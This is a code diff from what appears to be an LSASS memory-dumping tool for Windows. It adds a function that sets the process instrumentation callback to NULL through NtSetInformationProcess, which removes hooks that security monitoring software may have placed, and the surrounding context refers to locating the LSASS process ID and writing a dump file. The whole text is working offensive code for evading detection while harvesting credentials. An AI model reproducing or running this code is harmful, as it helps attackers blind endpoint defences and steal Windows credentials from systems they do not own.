@@ -549,7 +549,38 @@ DWORD get_lsass_pid(void)
     return lsass_pid;
 }
 
+BOOL remove_syscall_callback_hook()
+{
+    // you can remove this function by providing the compiler flag: -DNOSYSHOOK
+#ifndef NOSYSHOOK
+    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION process_information;
+#ifdef _WIN64
+    process_information.Version = 0;
+#else
+    process_information.Version = 1;
 #endif
+    process_information.Reserved = 0;
+    process_information.Callback = NULL; // remove the callback function, if any
+
+    NTSTATUS status = NtSetInformationProcess_(
+        NtCurrentProcess(),
+        ProcessInstrumentationCallback,
+        &process_information,
+        sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION)
+    );
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtSetInformationProcess", status);
+        DPRINT_ERR("Failed to remove the syscall callback hook");
+        return FALSE;
+    }
+    else
+    {
+        DPRINT("The syscall callback hook was set to NULL");
+    }
+#endif
+    return TRUE;
+}
 
 void print_success(
     LPCSTR dump_path,
@@ -587,6 +618,8 @@ void print_success(
         )
     }
 }
+
+#endif
 
 void free_linked_list(
     PVOID head
